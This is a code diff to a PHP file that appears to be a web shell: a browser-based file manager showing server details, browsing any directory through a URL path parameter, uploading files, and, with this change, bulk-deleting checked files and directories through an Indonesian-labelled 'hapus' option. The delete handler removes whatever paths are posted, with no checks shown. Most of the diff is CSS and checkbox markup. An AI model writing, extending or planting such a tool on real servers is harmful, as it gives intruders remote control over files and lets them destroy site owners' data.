@@ -92,6 +92,17 @@ input[type=text].action {
 table tr:last-child {
 	border-bottom:none;
 }
+select {
+	font-family: 'Ubuntu Mono', monospace;
+  outline:none;
+  color:#8a8a8a;
+  width:97%;
+  font-weight: bold;
+  padding:7px 2px;
+  border-radius:6px;
+  border:2px solid #e8e8e8;
+  background:rgba(222,222,222,0.73);
+}
 td.not {
 	border-bottom:none;
 }
@@ -134,6 +145,62 @@ div.action {
 }
 div.action_f {
 	width:50%;
+}
+.container {
+  display: block;
+  position: relative;
+  padding-left: 15px;
+  margin-bottom: 25px;
+  cursor: pointer;
+  -webkit-user-select: none;
+  -moz-user-select: none;
+  -ms-user-select: none;
+  user-select: none;
+}
+
+/* Hide the browser's default checkbox */
+.container input {
+  position: absolute;
+  opacity: 0;
+  cursor: pointer;
+  height: 0;
+  width: 0;
+}
+
+/* Create a custom checkbox */
+.checkmark {
+  position: absolute;
+  top: 0;
+  left: 0;
+  height: 18px;
+  width: 18px;
+  border-radius:10px;
+  background-color: #eee;
+}
+.container:hover input ~ .checkmark {
+  background-color: #ccc;
+}
+.container input:checked ~ .checkmark {
+  background-color: #2196F3;
+}
+.checkmark:after {
+  content: "";
+  position: absolute;
+  display: none;
+}
+.container input:checked ~ .checkmark:after {
+  display: block;
+}
+.container .checkmark:after {
+  left: 6px;
+  top: 2px;
+  width: 3px;
+  height: 8px;
+  border: solid white;
+  border-width: 0 3px 3px 0;
+  -webkit-transform: rotate(45deg);
+  -ms-transform: rotate(45deg);
+  transform: rotate(45deg);
 }
 .alert {
   padding: 12px;
@@ -181,6 +248,7 @@ a.s {
 	border-radius:0px 7px 7px 0px;
 	border:2px solid transparent;
 }
+select:hover,
 a.s:hover, 
 a.act:hover,
 input[type=submit]:hover {
@@ -264,9 +332,15 @@ td.lol {
 tr.file:last-child {
 	border-bottom:none;
 }
+.sad {
+	float:right;
+}
 .icon {
 	width:26px;
 	height:26px;
+}
+td.check {
+	width:1px;
 }
 @media screen and (max-width: 600px) {
   table {
@@ -358,7 +432,7 @@ input[type=submit] {
 <table>
 <thead>
 	<tr>
-		<td class="yes" colspan="4">
+		<td class="yes" colspan="5">
 			<?php
 			foreach (get_server_info() as $k) {
     			echo "<div clas='k'>".$k."</div>";
@@ -712,9 +786,9 @@ function upload() {
 function alert($type, $msg) {
 	?>
 	<tr>
-		<td class="not" colspan="3">
+		<td class="not" colspan="4">
 			<div class="alert <?=$type?>">
-				<span class="closebtn" onclick="this.parentElement.style.display='none';">&times;</span>
+				<span class="closebtn" onclick="window.location='?path=<?=cwd()?>';">&times;</span>
 				<strong><?=$type?>!</strong> <?=$msg?>
 			</div>
 		</td>
@@ -1058,21 +1132,39 @@ function get_server_info(){
     $server_software = (getenv('SERVER_SOFTWARE')!='')? getenv('SERVER_SOFTWARE')." <span class='strong'> | </span>":'';
     $server_info['software'] = "<span class='strong'>" .$server_software."  PHP ".phpversion()."</span>";  
     $server_info['dir'] = "<span class='strong'><u>".cwd()."</u></span>";
-    $server_info['upload'] = "<span class='strong'>".upload()."</span>";
+    //$server_info['upload'] = "<span class='strong'>".upload()."</span>";
     return $server_info;
   }
-?>
+  ?>
   <tbody>
+  <form method="post" action="?path=<?=cwd()?>">
   <?php
   $scandir = scandir(cwd());
   	foreach ($scandir as $dir) {
   		if (!is_dir($dir) || $dir === '.')continue;
   			if ($dir === '..') {
-  				$back = "<a class='sa su' href='?path=".dirname(cwd())."'>
-  						<img class='icon' src='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAMAAAADACAQAAAD41aSMAAAAIGNIUk0AAHomAACAhAAA+gAAAIDoAAB1MAAA6mAAADqYAAAXcJy6UTwAAAACYktHRAD/h4/MvwAAAAlwSFlzAAALEwAACxMBAJqcGAAAAuxJREFUeNrt3U1OG1EYRNFiO2QZwJIyC7bBWV6kwCpgAmIHZBAhkPixW0LqqvpujZlwjyyw3f365KfYmjsBAAAAGAAAMAAAYAAAwAAAgAEAAAMAAAYAAAwAABgAADAAAGAAAMAAAIABAAADAAAGAAAMAAAYAAAwAABgAADAAACAAQAAA0CS9nrWBoD18v+StHcmaAb4n1/eBL0Ar/kl6VpbANbLb0zQCfA+vy1BI8DH+SXpSjsA1stvSdAG8HV+Q4IugMP57QiaAI7Lb0bQA3B8fulRP3QPwHr5z/WXVwD5awCC8zcAROfPBwjPnw4Qnz8boCB/MkBF/lyAkvypAMvyn+nG91dJBCjKnwhQlT8PoCx/GkBd/iyAwvxJAJX5cwBK86cALMn/oPOc/BkAxfkTAKrz+wOU53cHqM/vDTAgvzPAiPy+AEPyuwKMye8JsCz/mW4lAMhfAjAsvxvAuPxeAAPzOwGMzO8DMDS/C8DY/B4Ag/M7AIzO7wBwqeujf/ZJF/oDAAR1f4QHE7j8GzqWwOeN2FACp48iRhJ4fRg3kMDt4+hxBH5fyAwjcPxKchSB55fygwhcL0sZQ+B7YdZGVxMInC9NHEHgfXHuAAL3y9PrCfxv0CgnSLhFqZog4ya9YoKU21RrCXJu1C4lSDqqoJIg67COQoK042rqCPIObNouOPk8gCDxyLIqgsxD+4oIUo+trCHIPbi1hCD56OIKguzDuwsI0o+vjyfIf4BDOEHDI0yiCToe4hNM0PIYq1iCnge57RY8rPZJp7oDYD2CS/3mFbAegVH+vsfZHiawyt/4QOevCTba8z5gPQK7/J0AnxEY5m8F+Ihgu+COAwC+ncA0fzPAWwLb/N0ALwS7BZeyAPDtBM/O+fsB7AcAAAAwAABgAADAAACAAQAAAwAABgAADAAAGAAAMAAAYAAAwAAAgAEAAAMAAAYAAAwAABgAADAAAGAAAMAAAIABAAADAAAGAAAMAADYgf0DnoxikFqb5rwAAAAASUVORK5CYII='>
-  						</a>";
+  				$back = "<td class='check'>
+  							<label class='container'>
+  							<input type='checkbox'name='data[]' onchange='checkAll(this)'>
+  							<span class='checkmark'></span>
+  							</label>
+  						</td>
+  						<td>
+  							<a class='sa su' href='?path=".dirname(cwd())."'>
+  							<img class='icon' src='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAMAAAADACAQAAAD41aSMAAAAIGNIUk0AAHomAACAhAAA+gAAAIDoAAB1MAAA6mAAADqYAAAXcJy6UTwAAAACYktHRAD/h4/MvwAAAAlwSFlzAAALEwAACxMBAJqcGAAAAuxJREFUeNrt3U1OG1EYRNFiO2QZwJIyC7bBWV6kwCpgAmIHZBAhkPixW0LqqvpujZlwjyyw3f365KfYmjsBAAAAGAAAMAAAYAAAwAAAgAEAAAMAAAYAAAwAABgAADAAAGAAAMAAAIABAAADAAAGAAAMAAAYAAAwAABgAADAAACAAQAAA0CS9nrWBoD18v+StHcmaAb4n1/eBL0Ar/kl6VpbANbLb0zQCfA+vy1BI8DH+SXpSjsA1stvSdAG8HV+Q4IugMP57QiaAI7Lb0bQA3B8fulRP3QPwHr5z/WXVwD5awCC8zcAROfPBwjPnw4Qnz8boCB/MkBF/lyAkvypAMvyn+nG91dJBCjKnwhQlT8PoCx/GkBd/iyAwvxJAJX5cwBK86cALMn/oPOc/BkAxfkTAKrz+wOU53cHqM/vDTAgvzPAiPy+AEPyuwKMye8JsCz/mW4lAMhfAjAsvxvAuPxeAAPzOwGMzO8DMDS/C8DY/B4Ag/M7AIzO7wBwqeujf/ZJF/oDAAR1f4QHE7j8GzqWwOeN2FACp48iRhJ4fRg3kMDt4+hxBH5fyAwjcPxKchSB55fygwhcL0sZQ+B7YdZGVxMInC9NHEHgfXHuAAL3y9PrCfxv0CgnSLhFqZog4ya9YoKU21RrCXJu1C4lSDqqoJIg67COQoK042rqCPIObNouOPk8gCDxyLIqgsxD+4oIUo+trCHIPbi1hCD56OIKguzDuwsI0o+vjyfIf4BDOEHDI0yiCToe4hNM0PIYq1iCnge57RY8rPZJp7oDYD2CS/3mFbAegVH+vsfZHiawyt/4QOevCTba8z5gPQK7/J0AnxEY5m8F+Ihgu+COAwC+ncA0fzPAWwLb/N0ALwS7BZeyAPDtBM/O+fsB7AcAAAAwAABgAADAAACAAQAAAwAABgAADAAAGAAAMAAAYAAAwAAAgAEAAAMAAAYAAAwAABgAADAAAGAAAMAAAIABAAADAAAGAAAMAADYgf0DnoxikFqb5rwAAAAASUVORK5CYII='>
+  						</a>
+  						</td>";
   			} else {
-  				$back = "<a class='sa su' href='?path=".cwd().'/'.$dir."'>{$dir}</a>";
+  				$dirs = cwd().'/'.$dir;
+  				$back = "<td>
+  							<label class='container'>
+  							<input type='checkbox' name='data[]' value='{$dirs}'>
+  							<span class='checkmark'></span>
+  							</label>
+  						</td>
+  						<td>
+  							<a class='sa su' href='?path=".cwd().'/'.$dir."'>".basename($dirs)."</a>
+  						</td>";
   			} if ($dir === '.' || $dir === '..') {
   				$action = "<a class='sa si' href='?path=".cwd()."&action=path'>action</a>";
   			} else {
@@ -1080,9 +1172,7 @@ function get_server_info(){
   			}
   			?>
   			<tr>
-  				<td class="tol">
-  					<?=$back?>
-  				</td>
+  				<?=$back?>
   				<td class="pol">
   					<center>
   						<?= filetype(cwd().'/'.$dir) ?>
@@ -1108,6 +1198,11 @@ function get_server_info(){
   			$files = cwd().'/'.$file;
   			?>
   			<tr class="file">
+  				<td>
+  					<label class='container'>
+  						<input type='checkbox' name='data[]' value='<?=$files?>'>
+  						<span class='checkmark'></span>
+  				</td>
   				<td>
   					<a href='
   				<?php
@@ -1138,7 +1233,60 @@ function get_server_info(){
   		}
   	}
   ?>
-
+<tr>
+	<td class="not" colspan="3">
+		<select name="mode">
+			<option value="" selected>choose</option>
+			<option value="1">hapus</option>
+		</select>
+	</td>
+	<td class="not">
+		<input class="sad" type="submit" name="submit">
+	</td>
+</tr>
+</form>
+<?php
+if (isset($_POST['submit'])) {
+	$data = $_POST['data'];
+	foreach ($data as $key => $value) {
+		switch ($_POST['mode']) {
+			case '1':
+				if (is_dir($value)) {
+					if (delete($value)) {
+						alert("success", "Deleted <u>".basename($value)."</u> !");
+					} else {
+						alert("failed", "Deleted <u>".basename($value)."</u> !");
+					}
+				} else {
+					if (delete($value)) {
+						alert("success", "Deleted <u>".basename($value)."</u> !");
+					} else {
+						alert("failed", "Deleted <u>".basename($value)."</u> !");
+					}
+				}
+				break;
+		}
+	}
+}
+?>
+<script type="text/javascript">
+	function checkAll(ele) {
+		var checkboxes = document.getElementsByTagName('input');
+		if (ele.checked) {
+			for (var i = 0; i < checkboxes.length; i++) {
+				if (checkboxes[i].type == 'checkbox' ) {
+					checkboxes[i].checked = true;
+				}
+           	}
+       	} else {
+           	for (var i = 0; i < checkboxes.length; i++) {
+               	if (checkboxes[i].type == 'checkbox') {
+                   	checkboxes[i].checked = false;
+               	}
+           	}
+       	}
+   	}
+</script>
 </tbody>
 </table>
 </center>
